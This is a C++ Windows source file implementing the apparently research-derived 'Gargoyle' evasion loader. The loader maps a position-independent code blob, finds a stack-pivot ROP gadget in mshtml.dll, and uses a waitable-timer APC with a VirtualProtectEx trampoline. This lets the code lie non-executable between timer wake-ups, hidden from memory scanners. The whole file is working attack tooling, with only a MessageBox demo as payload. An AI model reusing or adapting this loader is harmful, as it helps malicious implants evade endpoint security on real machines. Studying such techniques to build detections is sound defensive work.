#include <algorithm>
#include <array>
#include <cstdio>
#include <cstdint>
#include <exception>
#include <fstream>
#include <stdexcept>
#include <string>
#include <tuple>
#include <vector>

#include <Windows.h>
#include <DbgHelp.h>
#include <winnt.h>

using namespace std;

namespace {
  typedef void(*callable)(void*);
  typedef tuple<void*, size_t> MyTuple;
  constexpr DWORD invocation_interval_ms = 15 * 1000;
  constexpr size_t stack_size = 0x10000;

  constexpr array<array<uint8_t, 3>, 2> rop_gadget_candidates{ {
    { 0x59, 0x5C, 0xC3 },                   // pop ecx; pop esp; ret
    { 0x58, 0x5C, 0xC3 }                    // pop eax; pop esp; ret
  } };

  /// Mirrors the NASM Configuration layout consumed by setup.nasm.
  struct SetupConfiguration {
    uint32_t initialized;
    void* setup_address;
    uint32_t setup_length;
    void* VirtualProtectEx;
    void* WaitForSingleObjectEx;
    void* CreateWaitableTimer;
    void* SetWaitableTimer;
    void* MessageBox;
    void* tramp_addr;
    void* sleep_handle;
    uint32_t interval;
    void* target;
    uint8_t shadow[8];
  };

  /// Holds the VirtualProtectEx call frame used when the ROP gadget pivots back.
  struct StackTrampoline {
    void* VirtualProtectEx;
    void* return_address;
    void* current_process;
    void* address;
    uint32_t size;
    uint32_t protections;
    void* old_protections_ptr;
    uint32_t old_protections;
    void* setup_config;
  };

  /// Owns all mutable memory needed by the PIC: configuration, scratch stack, and trampoline.
  struct Workspace {
    SetupConfiguration config;
    uint8_t stack[stack_size];
    StackTrampoline tramp;
  };

  struct GadgetSelection {
    void* address;
    string source;
  };

  string win32_error(const string& operation, DWORD error = GetLastError()) {
    LPSTR message = nullptr;
    auto chars = FormatMessageA(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
      nullptr,
      error,
      MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
      reinterpret_cast<LPSTR>(&message),
      0,
      nullptr
    );

    string result = operation + " failed (GetLastError=" + to_string(error) + ")";
    if (chars && message) {
      string formatted{ message, chars };
      while (!formatted.empty() && (formatted.back() == '\r' || formatted.back() == '\n')) {
        formatted.pop_back();
      }
      result += ": " + formatted;
    }
    if (message) {
      LocalFree(message);
    }
    return result;
  }

  const char* page_protection_name(DWORD protection) {
    switch (protection) {
    case PAGE_EXECUTE_READ:
      return "PAGE_EXECUTE_READ";
    case PAGE_EXECUTE_READWRITE:
      return "PAGE_EXECUTE_READWRITE";
    case PAGE_READONLY:
      return "PAGE_READONLY";
    case PAGE_READWRITE:
      return "PAGE_READWRITE";
    default:
      return "unknown protection";
    }
  }
}

/// Allocates the mutable workspace shared with the PIC.
Workspace& allocate_workspace() {
  auto result = VirtualAllocEx(GetCurrentProcess(), nullptr, sizeof(Workspace), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!result) throw runtime_error("[-] " + win32_error("VirtualAllocEx workspace allocation"));
  RtlSecureZeroMemory(result, sizeof(Workspace));
  return *static_cast<Workspace*>(result);
}

/// Loads a raw PIC blob and marks it executable.
MyTuple allocate_pic(const string& filename) {
  fstream file_stream{ filename, fstream::in | fstream::ate | fstream::binary };
  if (!file_stream) throw runtime_error("[-] Couldn't open \"" + filename + "\".");
  auto pic_size = static_cast<size_t>(file_stream.tellg());
  file_stream.seekg(0, fstream::beg);
  auto pic = VirtualAllocEx(GetCurrentProcess(), nullptr, pic_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!pic) throw runtime_error("[-] " + win32_error("VirtualAllocEx PIC allocation"));
  file_stream.read(static_cast<char*>(pic), pic_size);
  if (!file_stream) throw runtime_error("[-] Couldn't read complete PIC from \"" + filename + "\".");
  file_stream.close();
  DWORD old_protection;
  auto prot_result = VirtualProtectEx(GetCurrentProcess(), pic, pic_size, PAGE_EXECUTE_READ, &old_protection);
  if (!prot_result) throw runtime_error("[-] " + win32_error("VirtualProtectEx PIC protection"));
  printf("[ ] Protected \"%s\" as %s (old protection 0x%08lx).\n",
    filename.c_str(),
    page_protection_name(PAGE_EXECUTE_READ),
    old_protection);
  return MyTuple(pic, pic_size);
}

/// Finds a compatible stack-pivot gadget in an executable section of a system DLL.
void* get_system_dll_gadget(const string& system_dll_filename) {
  printf("[ ] Loading \"%s\" system DLL.\n", system_dll_filename.c_str());
  auto dll_base = reinterpret_cast<uint8_t*>(LoadLibraryA(system_dll_filename.c_str()));
  if (!dll_base) throw runtime_error("[-] " + win32_error("LoadLibraryA " + system_dll_filename));

  printf("[+] Loaded \"%s\" at 0x%p.\n", system_dll_filename.c_str(), static_cast<void*>(dll_base));

  auto pe_header = ImageNtHeader(dll_base);
  if (!pe_header) throw runtime_error("[-] ImageNtHeader returned null for \"" + system_dll_filename + "\".");

  auto executable_section_headers = vector<PIMAGE_SECTION_HEADER>();
  auto current_section_header = reinterpret_cast<PIMAGE_SECTION_HEADER>(pe_header + 1);
  for (int i = 0; i < pe_header->FileHeader.NumberOfSections; ++i)
  {
    if (current_section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      executable_section_headers.push_back(current_section_header);
      printf("[ ] Found executable section \"%.*s\" at 0x%p (%lu bytes).\n",
        IMAGE_SIZEOF_SHORT_NAME,
        reinterpret_cast<const char*>(current_section_header->Name),
        static_cast<void*>(dll_base + current_section_header->VirtualAddress),
        static_cast<unsigned long>(current_section_header->Misc.VirtualSize));
    }
    current_section_header++;
  }

  for (auto candidate_section_header : executable_section_headers)
  {
    for (const auto& rop_gadget : rop_gadget_candidates)
    {
      auto section_base = dll_base + candidate_section_header->VirtualAddress;
      auto section_end = section_base + candidate_section_header->Misc.VirtualSize;
      auto search_result = search(section_base, section_end, begin(rop_gadget), end(rop_gadget));
      if (search_result == section_end)
        continue;

      printf("[+] Found ROP gadget in section \"%.*s\" at 0x%p.\n",
        IMAGE_SIZEOF_SHORT_NAME,
        reinterpret_cast<const char*>(candidate_section_header->Name),
        static_cast<void*>(search_result));
      return search_result;
    }
  }

  printf("[-] Didn't find ROP gadget in \"%s\".\n", system_dll_filename.c_str());
  return 0;
}

/// Selects either a system-DLL gadget or the tiny fallback gadget PIC.
GadgetSelection get_gadget(bool use_system_dll, const string& gadget_system_dll_filename, const string& gadget_pic_path) {
  void* memory = nullptr;
  if (use_system_dll) {
    printf("[ ] Gadget source candidate: system DLL search in \"%s\".\n", gadget_system_dll_filename.c_str());
    memory = get_system_dll_gadget(gadget_system_dll_filename);
    if (memory) {
      return GadgetSelection{ memory, "system DLL: " + gadget_system_dll_filename };
    }
  }
  if (!use_system_dll || !memory) {
    printf("[ ] Gadget source candidate: allocated fallback gadget PIC.\n");
    printf("[ ] Allocating executable memory for \"%s\".\n", gadget_pic_path.c_str());
    size_t size;
    tie(memory, size) = allocate_pic(gadget_pic_path);
    printf("[+] Allocated %zu bytes for gadget PIC.\n", size);
    return GadgetSelection{ memory, "allocated fallback PIC: " + gadget_pic_path };
  }
  return GadgetSelection{ memory, "unknown" };
}

/// Wires together the PIC, gadget, trampoline, scratch stack, and demo payload.
void launch(const string& setup_pic_path, const string& gadget_system_dll_filename, const string& gadget_pic_path) {
  printf("[ ] Allocating executable memory for \"%s\".\n", setup_pic_path.c_str());
  void* setup_memory; size_t setup_size;
  tie(setup_memory, setup_size) = allocate_pic(setup_pic_path);
  printf("[+] Allocated %zu bytes for PIC.\n", setup_size);

  auto use_system_dll{ true };
  printf("[ ] Configuring ROP gadget.\n");
  auto gadget = get_gadget(use_system_dll, gadget_system_dll_filename, gadget_pic_path);
  auto gadget_memory = gadget.address;
  printf("[ ] ROP gadget source: %s at 0x%p.\n", gadget.source.c_str(), gadget_memory);
  printf("[+] ROP gadget configured.\n");

  printf("[ ] Allocating read/write memory for config, stack, and trampoline.\n");
  auto& scratch_memory = allocate_workspace();
  auto& config = scratch_memory.config;
  auto& tramp = scratch_memory.tramp;
  printf("[+] Allocated %zu bytes for scratch memory.\n", sizeof(scratch_memory));

  printf("[ ] Building stack trampoline.\n");
  tramp.old_protections_ptr = &tramp.old_protections;
  tramp.protections = PAGE_EXECUTE_READ;
  tramp.current_process = GetCurrentProcess();
  tramp.VirtualProtectEx = VirtualProtectEx;
  tramp.size = static_cast<uint32_t>(setup_size);
  tramp.address = setup_memory;
  tramp.return_address = setup_memory;
  tramp.setup_config = &config;
  printf("[ ] Stack pivot target: APC gadget pivots to trampoline 0x%p.\n", static_cast<void*>(&tramp));
  printf("[ ] APC re-entry protection restore: VirtualProtectEx(0x%p, %zu, %s).\n",
    setup_memory,
    setup_size,
    page_protection_name(tramp.protections));
  printf("[ ] Stack trampoline returns to setup PIC at 0x%p after restoring execute permissions.\n", setup_memory);
  printf("[+] Stack trampoline built.\n");

  printf("[ ] Building configuration.\n");
  config.setup_address = setup_memory;
  config.setup_length = static_cast<uint32_t>(setup_size);
  config.VirtualProtectEx = VirtualProtectEx;
  config.WaitForSingleObjectEx = WaitForSingleObjectEx;
  config.CreateWaitableTimer = CreateWaitableTimerW;
  config.SetWaitableTimer = SetWaitableTimer;
  config.MessageBox = MessageBoxA;
  config.tramp_addr = &tramp;
  config.interval = invocation_interval_ms;
  config.target = gadget_memory;
  printf("[ ] Timer setup APIs: CreateWaitableTimerW=0x%p, SetWaitableTimer=0x%p.\n",
    config.CreateWaitableTimer,
    config.SetWaitableTimer);
  printf("[ ] APC setup: callback gadget=0x%p, callback argument trampoline=0x%p.\n",
    config.target,
    config.tramp_addr);
  printf("[ ] Alertable wait: WaitForSingleObjectEx=0x%p, timer period=%lu ms.\n",
    config.WaitForSingleObjectEx,
    invocation_interval_ms);
  printf("[ ] PIC protection cycle: %s -> %s while waiting -> %s on APC re-entry.\n",
    page_protection_name(PAGE_EXECUTE_READ),
    page_protection_name(PAGE_READONLY),
    page_protection_name(PAGE_EXECUTE_READ));
  printf("[+] Configuration built.\n");

  printf("[+] Success!\n");
  printf("    ================================\n");
  printf("    Gargoyle PIC @ -----> 0x%p\n", setup_memory);
  printf("    ROP gadget @ -------> 0x%p\n", gadget_memory);
  printf("    Configuration @ ----> 0x%p\n", static_cast<void*>(&scratch_memory.config));
  printf("    Top of stack @ -----> 0x%p\n", static_cast<void*>(&scratch_memory.stack));
  printf("    Bottom of stack @ --> 0x%p\n", static_cast<void*>(&scratch_memory.stack[stack_size-1]));
  printf("    Stack trampoline @ -> 0x%p\n", static_cast<void*>(&scratch_memory.tramp));

  reinterpret_cast<callable>(setup_memory)(&config);
}

int main() {
  setvbuf(stdout, nullptr, _IONBF, 0);
  try {
    launch("setup.pic", "mshtml.dll", "gadget.pic");
  } catch (exception& e) {
    printf("%s\n", e.what());
    return 1;
  }
  return 0;
}
